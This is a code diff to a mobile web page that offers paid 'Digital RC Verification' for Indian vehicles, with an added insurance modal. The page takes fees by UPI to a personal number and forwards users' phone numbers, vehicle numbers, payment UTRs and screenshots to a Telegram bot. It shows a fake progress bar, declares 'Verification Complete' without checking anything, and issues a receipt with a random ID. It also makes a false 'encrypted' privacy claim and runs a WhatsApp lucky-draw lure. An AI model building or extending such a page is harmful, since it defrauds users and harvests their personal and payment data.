@@ -7,7 +7,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --primary: #ff0066; --ind-blue: #003399; --gold: #FFD700; }
+        :root { --primary: #ff0066; --ind-blue: #003399; --gold: #FFD700; --green: #138808; }
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
         
         body { 
@@ -16,6 +16,7 @@
             color: #000; overflow-x: hidden; min-height: 100vh;
         }
 
+        /* UI Components */
         .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; height: 60px; border-bottom: 3px solid var(--ind-blue); }
         .menu-btn { cursor: pointer; display: flex; flex-direction: column; gap: 4px; width: 28px; z-index: 1001; }
         .menu-btn div { width: 100%; height: 3px; background: var(--ind-blue); border-radius: 2px; }
@@ -24,21 +25,19 @@
         .sidebar { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: #fff; transition: 0.4s; z-index: 2000; padding: 80px 20px; box-shadow: 5px 0 15px rgba(0,0,0,0.2); overflow-y: auto; }
         .sidebar.active { left: 0; }
         .s-link { display: block; width: 100%; padding: 14px; margin-bottom: 12px; background: #f8f9fa; border-radius: 8px; text-decoration: none; color: #333; font-weight: bold; border: 1px solid #ddd; cursor:pointer; text-align: left; }
-        .s-link i { margin-right: 10px; color: var(--ind-blue); }
 
         .card { margin: 100px auto 20px; width: 92%; max-width: 420px; background: rgba(255, 255, 255, 0.98); padding: 30px 20px; border-radius: 25px; text-align: center; border: 2px solid var(--ind-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
 
-        /* NEW: Insurance Home Button */
+        /* Insurance Home Button */
         .ins-home-btn {
             background: linear-gradient(45deg, #003399, #0055ff);
             color: white; border: none; padding: 15px; border-radius: 15px;
             width: 100%; font-weight: bold; margin-bottom: 20px;
             display: flex; align-items: center; justify-content: center; gap: 10px;
-            box-shadow: 0 4px 15px rgba(0,51,153,0.3); cursor: pointer;
-            text-decoration: none; font-size: 16px;
+            box-shadow: 0 4px 15px rgba(0,51,153,0.3); cursor: pointer; font-size: 16px;
         }
 
-        /* NEW: Info Tile System */
+        /* Tile System */
         .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
         .tile {
             background: #fff; border: 2px solid #eee; border-radius: 12px;
@@ -50,6 +49,24 @@
         .tile i { font-size: 20px; color: var(--ind-blue); }
         .tile span { font-size: 12px; font-weight: bold; color: #333; }
 
+        /* Insurance Modal (The "Blogger" Replacement) */
+        .ins-modal {
+            position: fixed; inset: 0; background: #fff; z-index: 4000;
+            display: none; flex-direction: column; padding-top: 60px;
+            overflow-y: auto;
+        }
+        .ins-modal.active { display: flex; }
+        .ins-header { 
+            position: fixed; top: 0; width: 100%; background: var(--ind-blue); 
+            color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 18px;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .ins-body { padding: 20px; text-align: left; }
+        .ins-card { background: #f9f9f9; padding: 15px; border-radius: 12px; border-left: 5px solid var(--green); margin-bottom: 15px; }
+        .ins-card h4 { color: var(--ind-blue); margin-bottom: 5px; }
+        .ins-card p { font-size: 14px; color: #555; line-height: 1.4; }
+
+        /* Existing Components */
         .hsrp-plate { background: #fff; width: 100%; height: 80px; border: 2px solid #000; border-radius: 12px; display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; position: relative; }
         .ind-strip { background: var(--ind-blue); width: 65px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; z-index: 2; position: absolute; left: 0; }
         .ind-strip img { width: 30px; margin-bottom: 4px; }
@@ -104,18 +121,52 @@
         <button class="s-link" onclick="toggleM()" style="background:#ffdddd; margin-top: 20px;">Close Menu</button>
     </div>
 
+    <div class="ins-modal" id="insModal">
+        <div class="ins-header">
+            <span>🛡️ Insurance Portal</span>
+            <button onclick="toggleIns()" style="background:none; border:none; color:white; font-size:20px; cursor:pointer;">✕</button>
+        </div>
+        <div class="ins-body">
+            <h3 style="color:var(--ind-blue); margin-bottom:15px;">Vehicle Insurance Services</h3>
+            
+            <div class="ins-card">
+                <h4>1. Instant Insurance Check</h4>
+                <p>Verify your existing insurance validity and expiry date within seconds. No login required.</p>
+            </div>
+
+            <div class="ins-card">
+                <h4>2. Premium Calculator</h4>
+                <p>Check the best market rates for Bike, Car, and Commercial vehicle insurance from top providers.</p>
+            </div>
+
+            <div class="ins-card">
+                <h4>3. Renewal Service</h4>
+                <p>Renew your expired insurance policy instantly through our assisted WhatsApp support.</p>
+            </div>
+
+            <div class="ins-card" style="border-left-color: orange;">
+                <h4>📢 Lucky Draw Offer</h4>
+                <p><b>April Month Special:</b> 5 lucky winners will get 100% FREE Insurance renewal. Apply via WhatsApp!</p>
+            </div>
+
+            <button class="btn" onclick="window.location.href='https://wa.me/918709610091?text=Hi, I want to check my insurance'" style="background: #25d366;">
+                <i class="fab fa-whatsapp"></i> Chat With Insurance Expert
+            </button>
+            <p style="text-align: center; margin-top: 20px; font-size: 12px; color: #999;">© 2026 Apex Insurance Barauni</p>
+        </div>
+    </div>
+
     <div id="successOverlay" class="overlay">
         <h1 style="font-size: 40px;">😊</h1>
         <h1 style="font-size: 30px;">Verification Complete!</h1>
-        <p style="font-size: 18px; margin-top: 10px;">Service Record has been updated.</p>
         <button class="btn" id="dlBtn" style="background:#fff; color:green; width:260px; margin-top:25px; border: 2px solid green;">Download Receipt Now</button>
     </div>
 
     <div class="card">
         <div id="p1">
-            <a href="https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1" class="ins-home-btn">
-                <i class="fas fa-shield-alt"></i> VEHICLE INSURANCE CHECK
-            </a>
+            <button class="ins-home-btn" onclick="toggleIns()">
+                <i class="fas fa-shield-alt"></i> VEHICLE INSURANCE PORTAL
+            </button>
 
             <h2 style="margin-bottom:15px; color: var(--ind-blue);">Digital RC Verification</h2>
             <div class="hsrp-plate">
@@ -126,20 +177,16 @@
 
             <div class="info-grid">
                 <div class="tile" onclick="alert('Contact Support: 918709610091\nAvailable: 10AM - 6PM')">
-                    <i class="fas fa-headset"></i>
-                    <span>CONTACT US</span>
+                    <i class="fas fa-headset"></i><span>CONTACT US</span>
                 </div>
-                <div class="tile" onclick="alert('Terms: Service is for information records only. Valid for 24 hours.')">
-                    <i class="fas fa-file-contract"></i>
-                    <span>TERMS</span>
+                <div class="tile" onclick="alert('Terms: Service is for information records only.')">
+                    <i class="fas fa-file-contract"></i><span>TERMS</span>
                 </div>
-                <div class="tile" onclick="alert('Privacy: Your data is encrypted and handled securely.')">
-                    <i class="fas fa-user-shield"></i>
-                    <span>PRIVACY</span>
+                <div class="tile" onclick="alert('Privacy: Your data is encrypted.')">
+                    <i class="fas fa-user-shield"></i><span>PRIVACY</span>
                 </div>
-                <div class="tile" onclick="alert('Refund: Processing fees are non-refundable after initiation.')">
-                    <i class="fas fa-undo"></i>
-                    <span>REFUND</span>
+                <div class="tile" onclick="alert('Refund: Processing fees are non-refundable.')">
+                    <i class="fas fa-undo"></i><span>REFUND</span>
                 </div>
             </div>
         </div>
@@ -159,11 +206,9 @@
 
             <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10">
             <input type="text" id="fatherName" placeholder="Father's Name (Optional)">
-            <input type="tel" id="utr" class="utr-field" placeholder="Enter 12 Digit UTR Number" maxlength="12" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
-
+            <input type="tel" id="utr" class="utr-field" placeholder="Enter 12 Digit UTR Number" maxlength="12">
             <label class="screenshot-label">UTR नंबर दर्ज करें या स्क्रीनशॉट अपलोड करें 👇</label>
             <input type="file" id="screenshotInput" accept="image/*">
-
             <button class="btn" onclick="submit()">Verify & Generate Receipt</button>
         </div>
     </div>
@@ -177,7 +222,6 @@
     <div class="loader-wrap" id="load">
         <div class="road"><div class="car" id="carIcon">🚗</div></div>
         <div class="pct" id="pText">0%</div>
-        <p style="color:#fff; margin-top:10px;">🔍 Searching Records...</p>
     </div>
 
     <script>
@@ -187,6 +231,8 @@
         let promoUsed = "NONE";
         let globalTxId = "";
 
+        // Toggle Insurance Modal
+        function toggleIns() { document.getElementById('insModal').classList.toggle('active'); }
         function toggleM() { document.getElementById('side').classList.toggle('active'); }
 
         function formatV(i) {
@@ -206,18 +252,9 @@
 
         function applyPromo() {
             const code = document.getElementById('promoInput').value.toUpperCase();
-            if(code === "RC70") {
-                currentAmount = 70.00; 
-                promoUsed = "RC70";
-                alert("Applied! Payable: ₹70");
-            } else if(code === "RC60") {
-                currentAmount = 60.00; 
-                promoUsed = "RC60";
-                alert("Applied! Payable: ₹60");
-            } else {
-                alert("Code not valid.");
-                return;
-            }
+            if(code === "RC70") { currentAmount = 70.00; promoUsed = "RC70"; } 
+            else if(code === "RC60") { currentAmount = 60.00; promoUsed = "RC60"; }
+            else { alert("Code not valid."); return; }
             document.getElementById('promo-msg').style.display = "block";
             document.getElementById('amtLabel').innerText = `PAYMENT FOR VERIFICATION ₹${currentAmount}`;
             updatePaymentLinks(currentAmount);
@@ -231,8 +268,7 @@
         }
 
         function pay() { 
-            const upiUrl = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${currentAmount.toFixed(2)}&cu=INR&tn=VERIFICATION%20FEE`;
-            window.location.href = upiUrl; 
+            window.location.href = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${currentAmount.toFixed(2)}&cu=INR&tn=VERIFICATION%20FEE`; 
         }
 
         async function submit() {
@@ -240,9 +276,7 @@
             const u = document.getElementById('utr').value;
             const fileInput = document.getElementById('screenshotInput');
             if(m.length < 10) { alert("Invalid Mobile Number."); return; }
-            const isUtrValid = (u.length === 12);
-            const isFileSelected = (fileInput.files.length > 0);
-            if(!isUtrValid && !isFileSelected) { alert("कृपया 12-अंकों का UTR नंबर दर्ज करें या पेमेंट स्क्रीनशॉट अपलोड करें।"); return; }
+            if(u.length < 12 && fileInput.files.length === 0) { alert("Enter UTR or Upload Screenshot."); return; }
 
             document.getElementById('load').style.display='flex';
             let p = 0;
@@ -255,13 +289,11 @@
                     globalTxId = "RCV" + Math.floor(Math.random() * 9000000000);
                     const dStr = now.toLocaleDateString('en-IN');
                     const tStr = now.toLocaleTimeString('en-IN');
-                    let cap = `✅ *RECORD VERIFIED*\n\n📅 *Date:* ${dStr}\n⏰ *Time:* ${tStr}\n🆔 *Ref:* \`${globalTxId}\`\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n🔢 *UTR:* ${u || 'Not Provided'}\n💰 *Amt:* ₹${currentAmount}\n🎟️ *Promo:* ${promoUsed}`;
+                    let cap = `✅ *RECORD VERIFIED*\n\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${m}\n🔢 *UTR:* ${u || 'Screenshot'}\n💰 *Amt:* ₹${currentAmount}`;
                     
-                    if (isFileSelected) {
+                    if (fileInput.files.length > 0) {
                         const formData = new FormData();
-                        formData.append("chat_id", T_CHAT_ID);
-                        formData.append("caption", cap);
-                        formData.append("parse_mode", "Markdown");
+                        formData.append("chat_id", T_CHAT_ID); formData.append("caption", cap);
                         formData.append("photo", fileInput.files[0]);
                         fetch(`https://api.telegram.org/bot${T_TOKEN}/sendPhoto`, { method: "POST", body: formData });
                     } else {
@@ -270,11 +302,7 @@
                     saveHistory(document.getElementById('vehInput').value, dStr, tStr);
                     document.getElementById('dlBtn').onclick = () => { makePDF(dStr, tStr, globalTxId); };
                 }
-                if (p >= 100) {
-                    clearInterval(iv);
-                    document.getElementById('load').style.display='none';
-                    document.getElementById('successOverlay').style.display='flex';
-                }
+                if (p >= 100) { clearInterval(iv); document.getElementById('load').style.display='none'; document.getElementById('successOverlay').style.display='flex'; }
             }, 80);
         }
 
@@ -287,7 +315,7 @@
         function renderHistory() {
             let hist = JSON.parse(localStorage.getItem('rc_history_user') || "[]");
             if(hist.length > 0) {
-                let hHtml = hist.map(h => `<div style="font-size:11px; padding:8px; border-bottom:1px solid #eee; text-align:left;">🚗 <b>${h.v}</b><br><small>${h.d}</small></div>`).join('');
+                let hHtml = hist.map(h => `<div style="font-size:11px; padding:8px; border-bottom:1px solid #eee;">🚗 <b>${h.v}</b><br><small>${h.d}</small></div>`).join('');
                 document.getElementById('historyList').innerHTML = hHtml;
             }
         }
@@ -295,28 +323,14 @@
         function makePDF(d, t, tx) {
             const { jsPDF } = window.jspdf;
             const doc = new jsPDF();
-            const veh = document.getElementById('vehInput').value;
-            const mob = document.getElementById('mob').value;
-            const fn = document.getElementById('fatherName').value || "N/A";
-            const uNum = document.getElementById('utr').value || "N/A";
             doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 30, 'F');
-            doc.setTextColor(255); doc.setFont("helvetica", "bold"); doc.setFontSize(22);
-            doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 25, null, null, "center");
-            doc.setTextColor(0); doc.setFontSize(12); doc.setDrawColor(200);
+            doc.setTextColor(255); doc.setFontSize(22); doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 25, null, null, "center");
+            doc.setTextColor(0); doc.setFontSize(12);
             let y = 50;
-            const tableData = [["REFERENCE ID:", tx], ["DATE & TIME:", `${d} | ${t}`], ["VEHICLE NO:", veh], ["FATHER'S NAME:", fn], ["CONTACT NO:", mob], ["UTR NUMBER:", uNum]];
-            tableData.forEach(row => { doc.rect(15, y, 180, 10); doc.text(row[0], 20, y + 7); doc.text(row[1], 85, y + 7); y += 10; });
-            y += 5; doc.setFillColor(240, 245, 255); doc.rect(15, y, 180, 25, 'F'); doc.rect(15, y, 180, 25);
-            doc.setFontSize(11); doc.text("Total Processing Fee:", 20, y + 15); doc.setFont("helvetica", "bold"); doc.text("INR " + currentAmount.toFixed(2), 85, y + 15);
-            y += 35; doc.setFont("helvetica", "normal"); doc.rect(15, y, 180, 45); doc.text("SUPPORT INFORMATION", 25, y + 15);
-            doc.addImage(document.getElementById('qr').src, 'PNG', 150, y + 5, 35, 35);
-            y += 65; doc.setFontSize(14); doc.text("TERMS AND CONDITIONS", 15, y);
-            doc.setFontSize(10); doc.text(["1. Digital Information Receipt only.", "2. Fees are non-refundable.", "3. Information based on available records."], 15, y + 8);
-            doc.setTextColor(184, 134, 11); doc.setFont("times", "italic"); doc.setFontSize(40);
-            doc.text("Thank You", 105, y + 55, null, null, "center");
-            doc.setDrawColor(0); doc.rect(5, 5, 200, 287);
-            doc.save(`Receipt_${veh}.pdf`);
-            setTimeout(() => location.reload(), 1500);
+            const data = [["REF ID:", tx], ["DATE:", d], ["VEHICLE:", document.getElementById('vehInput').value], ["AMOUNT:", "INR " + currentAmount]];
+            data.forEach(row => { doc.text(row[0], 20, y); doc.text(row[1], 80, y); y += 10; });
+            doc.save(`Receipt_${tx}.pdf`);
+            location.reload();
         }
     </script>
 </body>
